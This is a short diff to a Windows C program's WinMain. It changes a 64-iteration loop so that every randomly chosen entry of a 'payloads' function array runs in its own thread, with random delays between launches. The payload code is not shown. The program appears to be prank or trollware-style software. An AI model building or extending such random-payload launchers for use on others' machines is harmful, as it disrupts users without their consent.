@@ -254,10 +254,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     fori(64) {
         int r = rand() % 32 + 1;
-        if (r == 8 || r == 20 || r == 21 || r == 22 || r == 26 || r == 27)
-            CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[r], NULL, 0, NULL);
-        else
-            payloads[r]();
+        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[r], NULL, 0, NULL);
+        Sleep(rand() % 5000);
     }
     
 
